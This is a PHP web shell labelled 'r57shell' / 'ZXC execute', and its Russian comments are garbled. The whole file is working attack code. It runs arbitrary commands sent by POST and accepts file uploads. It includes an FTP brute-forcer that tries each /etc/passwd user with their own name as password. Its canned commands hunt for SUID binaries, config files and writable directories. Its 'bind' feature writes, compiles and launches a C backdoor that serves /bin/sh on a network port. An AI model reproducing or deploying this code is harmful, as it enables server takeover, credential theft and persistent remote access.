<?
## ??????????????
$name="paradise        "; ## ????? ????????????
$pass="sm00th"; ## ?????? ????????????
/*
if(!isset($PHP_AUTH_USER))
  {
  Header('WWW-Authenticate: Basic realm="enter to paradise"');
  Header('HTTP/1.0 401 Unauthorized');
  exit;
  }
else
  {
  if(($PHP_AUTH_USER != $name ) || ($PHP_AUTH_PW != $pass))
    {
    Header('WWW-Authenticate: Basic realm="enter to paradise"');
    Header('HTTP/1.0 401 Unauthorized');
    exit;
    }
  }
*/
error_reporting(0);
set_time_limit(0);


/*
????? ?????
$language='ru' - ???????
$language='eng' - ??????????
*/

$language='ru';

$lang=array(
           'ru_text1' => '??????????? ???????',
           'ru_text2' => '?????????? ?????? ?? ???????',
           'ru_text3' => '????????? ???????',
           'ru_text4' => '??????? ??????????',
           'ru_text5' => '???????? ?????? ?? ??????',
           'ru_text6' => '????????? ????',
           'ru_text7' => '??????',
           'ru_text8' => '???????? ?????',
           'ru_butt1' => '?????????',
           'ru_butt2' => '?????????',
           'ru_text9' => '???????? ????? ? ???????? ??? ? /bin/bash',
           'ru_text10' => '??????? ????',
           'ru_text11' => '????????? ??????????',
           'ru_butt3' => '???????',

           'eng_text1' => 'Executed command',
           'eng_text2' => 'Execute command on server',
           'eng_text3' => '&nbsp;Run command',
           'eng_text4' => 'Work directory',
           'eng_text5' => 'Upload files on server',
           'eng_text6' => 'Local file',
           'eng_text7' => 'Aliases',
           'eng_text8' => 'Select alias',
           'eng_butt1' => 'Execute',
           'eng_butt2' => 'Upload',
           'eng_text9' => 'Bind port to /bin/bash',
           'eng_text10' => 'Port',
           'eng_text11' => 'Password for access',
           'eng_butt3' => 'Bind'
           );



/*
?????? ??????
????????? ???????? ????????????? ?????? ????? ? ???-?? ??????. ( ??????? ????????? ???? ????????? ???? )
?? ?????? ???? ????????? ??? ???????? ???????.
*/

function Xftp()
{
        $passwd='/etc/passwd';
        $ftp_server="127.0.0.1";
        $pwd = @fopen ($passwd, "r");
        $i=0;
        if ($pwd)
        {
            echo "FTP-server: $ftp_server\n";
            while (!feof ($pwd))
            {
            $i++;
                $buf = fgets($pwd, 100);
                ereg("^([0-9a-zA-Z]{1,})\:",$buf,$buf2);
                $user[0]=$buf2[1];
                $user[1]=$buf2[1];
                $user[3]=$buf;
                $status=ftp_connect($ftp_server);
                if($status)
                {
                    $login_status=@ftp_login($status, $user[0], $user[1]);
                    if($login_status)
                    {
                        $user[4]="valid";
                        $valid_ftp[]="$user[0]:$user[1]";
                        ftp_close($status);
                    }else{$user[4]="invalid";}
                }else{$user[4]="valid";}
                $result="$user[0]:$user[1]";
                #echo "$result\t$user[4]\n";
            }
            $bad=$i-count($valid_ftp);
            $good=count($valid_ftp);
            echo "\n\nFtp brutforce stats\nTotal: $i\n";
            echo "Bad: $bad";
            echo "\nGood: $good";
            echo "\nListing of valid accounts:\n\n";
            foreach($valid_ftp as $account){echo "$account\n";}
            echo "\nEnd of Listing.";
        }else{echo "Can't to read $passwd or another trouble\n";}
}

$aliases=array(
/* ????? ?? ??????? ???? ?????? ? suid ????? */
'find all suid files' => 'find / -type f -perm -04000 -ls',

/* ????? ?? ??????? ???? ?????? ? sgid ????? */
'find all sgid files' => 'find / -type f -perm -02000 -ls',

/* ????? ?? ??????? ?????? config.inc.php */
'find config.inc.php files' => 'find / -type f -name config.inc.php',

/* ????? ?? ??????? ?????? config.php */
'find config.php files' => 'find / -type f -name config.inc.php',

/* ??????? ?????? ??????????? gcc  */
'gcc version' => 'gcc -v',

/* ??????? ?????? ?????????????? perl  */
'perl version' => 'perl -v',

/* ??????? ?????? ????????? ?? ???????  */
'proceses listing' => 'ps axu',

/* ????? ?? ??????? ?????? config.inc.php */
'print /etc/passwd' => 'cat /etc/passwd',

/* ???????? ? ??? ?? ???????? login:login */
'bruteforce ftp using /etc/passwd' => 'zxc_brute',

/* ????? ?? ??????? ???? ?????????? ? ?????? ????????? ?? ?????? ??? ???? */
'find writable directories and files' => 'find / -perm -2 -ls',
'----------------------------------------------------------------------------------------------------' => 'ls -la'
);

?>
<html>
<head>
<title>ZXC execute</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<STYLE>
tr {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP:    #eeeeee 1px solid;
BORDER-LEFT:   #eeeeee 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
}
td {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP:    #eeeeee 1px solid;
BORDER-LEFT:   #eeeeee 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
}
table {
BORDER-RIGHT:  #eeeeee 2px outset;
BORDER-TOP:    #eeeeee 2px outset;
BORDER-LEFT:   #eeeeee 2px outset;
BORDER-BOTTOM: #eeeeee 2px outset;
BACKGROUND-COLOR: #D4D0C8;
}
input {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: 8pt Verdana;
}
select {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: 8pt Verdana;
}
submit {
BORDER-RIGHT:  buttonhighlight 2px outset;
BORDER-TOP:    buttonhighlight 2px outset;
BORDER-LEFT:   buttonhighlight 2px outset;
BORDER-BOTTOM: buttonhighlight 2px outset;
BACKGROUND-COLOR: #e4e0d8;
width: 30%;
}
textarea {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: Fixedsys bold;

}
BODY {
margin-top: 1px;
margin-right: 1px;
margin-bottom: 1px;
margin-left: 1px;
}
A:link {COLOR:red; TEXT-DECORATION: none}
A:visited { COLOR:red; TEXT-DECORATION: none}
A:active {COLOR:red; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}
</STYLE>

</head>
<body bgcolor="#e4e0d8">
<table width=100%cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td bgcolor=#cccccc>
<!-- logo -->
<font face=Verdana size=2>&nbsp;&nbsp;
<font face=Webdings size=6><b>!</b></font><b>&nbsp;&nbsp;r57shell</b>
</font>
</td></tr><table>
<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td align=right width=100>
<?
/* change dir */
if (($_POST['dir']!=="") AND ($_POST['dir'])) { chdir($_POST['dir']); }
/* display information */
echo "<font face=Verdana size=-2>";
echo "<font color=blue><b>uname -a :&nbsp;<br>id :&nbsp;<br>pwd :&nbsp;</b></font><br>";
echo "</td><td>";
echo "<font face=Verdana size=-2 color=red><b>";
echo "&nbsp;&nbsp;&nbsp; ".exec("uname -a")."<br>";
echo "&nbsp;&nbsp;&nbsp; ".exec("id")."<br>";
echo "&nbsp;&nbsp;&nbsp; ".exec("pwd")."";
echo "</b></font>";
echo "</font>";
?>
</td></tr></table>
<?
/* port bind */
if (($_POST['bind']) AND ($_POST['bind']=="bind.c") AND ($_POST['port']) AND ($_POST['bind_dir']))
{
 $port_bind_bd_c="
#define HOME \"$bind_dir\"

#define        TIOCSCTTY        0x540E
#define TIOCGWINSZ      0x5413
#define TIOCSWINSZ      0x5414
#define ECHAR        0x1d

#define PORT        $port

#define        BUF        32768


#include <sys/wait.h>
#include <sys/types.h>
#include <sys/resource.h>

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <fcntl.h>

struct winsize {
        unsigned short ws_row;
        unsigned short ws_col;
        unsigned short ws_xpixel;
        unsigned short ws_ypixel;
};

/* creates tty/pty name by index */
void        get_tty(int num, char *base, char *buf)
{
        char        series[] = \"pqrstuvwxyzabcde\";
        char        subs[] = \"0123456789abcdef\";
        int        pos = strlen(base);
        strcpy(buf, base);
        buf[pos] = series[(num >> 4) & 0xF];
        buf[pos+1] = subs[num & 0xF];
        buf[pos+2] = 0;
}

/* search for free pty and open it */
int        open_tty(int *tty, int *pty)
{
        char        buf[512];
        int        i, fd;

        fd = open(\"/dev/ptmx\", O_RDWR);
        close(fd);

        for (i=0; i < 256; i++) {
                get_tty(i, \"/dev/pty\", buf);
                *pty = open(buf, O_RDWR);
                if (*pty < 0) continue;
                get_tty(i, \"/dev/tty\", buf);
                *tty = open(buf, O_RDWR);
                if (*tty < 0) {
                        close(*pty);
                        continue;
                }
                return 1;
        }
        return 0;
}

/* to avoid creating zombies ;) */
void        sig_child(int i)
{
        signal(SIGCHLD, sig_child);
        waitpid(-1, NULL, WNOHANG);
}

void        hangout(int i)
{
        kill(0, SIGHUP);
        kill(0, SIGTERM);
}

int        main()
{
        int        pid;
        struct        sockaddr_in        serv;
        struct        sockaddr_in        cli;
        int        sock;

        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock < 0) {
                perror(\"socket\");
                return 1;
        }

        bzero((char *) &serv, sizeof(serv));
        serv.sin_family = AF_INET;
        serv.sin_addr.s_addr = htonl(INADDR_ANY);
        serv.sin_port = htons(PORT);
        if (bind(sock, (struct sockaddr *) &serv, sizeof(serv)) < 0) {
                perror(\"bind\");
                return 1;
        }
        if (listen(sock, 5) < 0) {
                perror(\"listen\");
                return 1;
        }

        printf(\"Daemon is starting...\"); fflush(stdout);
        pid = fork();
        if (pid !=0 ) {
                printf(\"OK, pid = %d\n\", pid);
                return 0;
        }

        /* daemonize */
        setsid();
        chdir("/");
        pid = open(\"/dev/null\", O_RDWR);
        dup2(pid, 0);
        dup2(pid, 1);
        dup2(pid, 2);
        close(pid);
        signal(SIGHUP, SIG_IGN);
        signal(SIGCHLD, sig_child);
        while (1) {
                int        scli;
                int        slen;
                slen = sizeof(cli);
                scli = accept(sock, (struct sockaddr *) &cli, &slen);
                if (scli < 0) continue;
                pid = fork();
                if (pid == 0) {
                        int        subshell;
                        int        tty;
                        int        pty;
                        fd_set        fds;
                        char        buf[BUF];
                        char        *argv[] = {\"sh\", \"-i\", NULL};
                        #define MAXENV        256
                        #define        ENVLEN        256
                        char        *envp[MAXENV];
                        char        envbuf[(MAXENV+2) * ENVLEN];
                        int        j, i;
                        char        home[256];

                        /* setup enviroment */
                        envp[0] = home;
                        sprintf(home, \"HOME=%s\", HOME);
                        j = 0;
                        do {
                                i = read(scli, &envbuf[j * ENVLEN], ENVLEN);
                                envp[j+1] = &envbuf[j * ENVLEN];
                                j++;
                                if ((j >= MAXENV) || (i < ENVLEN)) break;
                        } while (envbuf[(j-1) * ENVLEN] != '\n');
                        envp[j+1] = NULL;

                        /* create new group */
                        setpgid(0, 0);

                        /* open slave & master side of tty */
                        if (!open_tty(&tty, &pty)) {
                                char        msg[] = \"Can't fork pty, bye!\n\";
                                write(scli, msg, strlen(msg));
                                close(scli);
                                exit(0);
                        }
                        /* fork child */
                        subshell = fork();
                        if (subshell == 0) {
                                /* close master */
                                close(pty);
                                /* attach tty */
                                setsid();
                                ioctl(tty, TIOCSCTTY);
                                /* close local part of connection */
                                close(scli);
                                close(sock);
                                signal(SIGHUP, SIG_DFL);
                                signal(SIGCHLD, SIG_DFL);
                                dup2(tty, 0);
                                dup2(tty, 1);
                                dup2(tty, 2);
                                close(tty);
                                execve(\"/bin/sh\", argv, envp);
                        }
                        /* close slave */
                        close(tty);

                        signal(SIGHUP, hangout);
                        signal(SIGTERM, hangout);

                        while (1) {
                                /* watch tty and client side */
                                FD_ZERO(&fds);
                                FD_SET(pty, &fds);
                                FD_SET(scli, &fds);
                                if (select((pty > scli) ? (pty+1) : (scli+1),
                                    &fds, NULL, NULL, NULL) < 0)
                                    {
                                            break;
                                }
                                if (FD_ISSET(pty, &fds)) {
                                        int        count;
                                        count = read(pty, buf, BUF);
                                        if (count <= 0) break;
                                        if (write(scli, buf, count) <= 0) break;
                                }
                                if (FD_ISSET(scli, &fds)) {
                                        int        count;
                                        unsigned        char *p, *d;
                                        d = buf;
                                        count = read(scli, buf, BUF);
                                        if (count <= 0) break;

                                        /* setup win size */
                                        p = memchr(buf, ECHAR, count);
                                        if (p) {
                                                unsigned char        wb[5];
                                                int        rlen = count - ((ulong) p - (ulong) buf);
                                                struct        winsize ws;

                                                /* wait for rest */
                                                if (rlen > 5) rlen = 5;
                                                memcpy(wb, p, rlen);
                                                if (rlen < 5) {
                                                        read(scli, &wb[rlen], 5 - rlen);
                                                }

                                                /* setup window */
                                                ws.ws_xpixel = ws.ws_ypixel = 0;
                                                ws.ws_col = (wb[1] << 8) + wb[2];
                                                ws.ws_row = (wb[3] << 8) + wb[4];
                                                ioctl(pty, TIOCSWINSZ, &ws);
                                                kill(0, SIGWINCH);

                                                /* write the rest */
                                                write(pty, buf, (ulong) p - (ulong) buf);
                                                rlen = ((ulong) buf + count) - ((ulong)p+5);
                                                if (rlen > 0) write(pty, p+5, rlen);
                                        } else
                                                if (write(pty, d, count) <= 0) break;
                                }
                        }
                        close(scli);
                        close(sock);
                        close(pty);

                        waitpid(subshell, NULL, 0);
                        vhangup();
                        exit(0);
                }
                close(scli);
        }
}
";
 $w_file=fopen("/tmp/bind.c","ab+") or exit();
 fputs($w_file,$port_bind_bd_c);
 fclose($w_file);
 $blah=exec("gcc -o /tmp/bind /tmp/bind.c");
 $bind_string="/tmp/bind ".$_POST['port']." ".$_POST['bind_pass']."";
 $blah=exec($bind_string);
 $_POST['cmd']="ps -aux | grep bind";
}
?>
<?
/* alias execute */
if (($_POST['alias']) AND ($_POST['alias']!==""))
 {
 foreach ($aliases as $alias_name=>$alias_cmd) {
                                               if ($_POST['alias'] == $alias_name) {$_POST['cmd']=$alias_cmd;}
                                               }
 }
?>
<?
/* file upload */
if (($HTTP_POST_FILES["userfile"]!=="") AND ($HTTP_POST_FILES["userfile"]))
{
copy($HTTP_POST_FILES["userfile"][tmp_name],
            $_POST['dir']."/".$HTTP_POST_FILES["userfile"][name])
      or print("<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><td><tr><font color=red face=Fixedsys><div align=center>Error uploading file ".$HTTP_POST_FILES["userfile"][name]."</div></font></td></tr></table>");
}
?>
<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td bgcolor=#cccccc>
<?
/* command execute */
if ((!$_POST['cmd']) || ($_POST['cmd']=="")) { $_POST['cmd']="ls -la"; }
echo "<font face=Verdana size=-2>".$lang[$language._text1].": <b>".$_POST['cmd']."</b></font></td></tr><tr><td>";
echo "<b>";
echo "<div align=center><textarea name=report cols=122 rows=15>";
if($_POST['cmd']!="zxc_brute"){echo "".passthru($_POST['cmd'])."";}else{Xftp();}
echo "</textarea></div>";
echo "</b>";
?>
</td></tr></table>
<table width=100% heigth=0 cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: <? echo $lang[$language._text2]; ?> ::</div></b></font></td></tr>
<tr><td height=23>
<?
/* command execute form */
echo "<form name=command method=post>";
echo "<font face=Verdana size=-2>";
echo "<b>&nbsp;".$lang[$language._text3]." <font face=Wingdings color=gray>?</font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
echo "<input type=text name=cmd size=85>&nbsp;&nbsp;<br>";
echo "<b>&nbsp;".$lang[$language._text4]." <font face=Wingdings color=gray>?</font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
if ((!$_POST['dir']) OR ($_POST['dir']=="")) { echo "<input type=text name=dir size=85 value=".exec("pwd").">"; }
else { echo "<input type=text name=dir size=85 value=".$_POST['dir'].">"; }
echo "&nbsp;&nbsp;<input type=submit name=submit value=\" ".$lang[$language._butt1]." \">";
echo "</font>";
echo "</form>";
?>
</td></tr></table>
<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: <? echo $lang[$language._text5]; ?> ::</div></b></font></td></tr>
<tr><td>
<?
/* file upload form */
echo "<form name=upload method=POST ENCTYPE=multipart/form-data>";
echo "<font face=Verdana size=-2>";
echo "<b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".$lang[$language._text6]." <font face=Wingdings color=gray>?</font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
echo "<input type=file name=userfile size=85>&nbsp;";
if ((!$_POST['dir']) OR ($_POST['dir']=="")) { echo "<input type=hidden name=dir size=85 value=".exec("pwd").">"; }
else { echo "<input type=hidden name=dir size=85 value=".$_POST['dir'].">"; }
echo "<input type=submit name=submit value=\" ".$lang[$language._butt2]." \">";
echo "</font>";
echo "</form>";
?>
</td></tr></table>
<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: <? echo $lang[$language._text7]; ?> ::</div></b></font></td></tr>
<tr><td>
<?
/* aliases form */
echo "<form name=aliases method=POST>";
echo "<font face=Verdana size=-2>";
echo "<b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".$lang[$language._text8]." <font face=Wingdings color=gray>?</font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
echo "<select name=alias>";
foreach ($aliases as $alias_name=>$alias_cmd)
 {
 echo "<option>$alias_name</option>";
 }
 echo "</select>";
if ((!$_POST['dir']) OR ($_POST['dir']=="")) { echo "<input type=hidden name=dir size=85 value=".exec("pwd").">"; }
else { echo "<input type=hidden name=dir size=85 value=".$_POST['dir'].">"; }
echo "&nbsp;&nbsp;<input type=submit name=submit value=\" ".$lang[$language._butt1]." \">";
echo "</font>";
echo "</form>";
?>
</td></tr></table>


<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: <? echo $lang[$language._text9]; ?> ::</div></b></font></td></tr>
<tr><td>
<?
/* port bind form */
echo "<form name=bind method=POST>";
echo "<font face=Verdana size=-2>";
echo "<b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".$lang[$language._text10]." <font face=Wingdings color=gray>?</font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
echo "<input type=text name=port size=15 value=13543>&nbsp;";
echo "<b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".$lang[$language._text11]." <font face=Wingdings color=gray>?</font>&nbsp;&nbsp;&nbsp;&nbsp;</b>";
echo "<input type=text name=bind_dir size=15 value=\"/\">&nbsp;";
if ((!$_POST['dir']) OR ($_POST['dir']=="")) { echo "<input type=hidden name=dir size=85 value=".exec("pwd").">"; }
else { echo "<input type=hidden name=dir size=85 value=".$_POST['dir'].">"; }
echo "<input type=hidden name=bind size=1 value=bind.c>";
echo "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=submit value=\" ".$lang[$language._butt3]." \">";
echo "</font>";
echo "</form>";
?>
</td></tr></table>




<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td bgcolor=#cccccc>
<?
echo "<div align=center><font face=Verdana size=-2><b>o---[ ZXC execute ]---o</b></font></div>";
?>
</td></tr></table>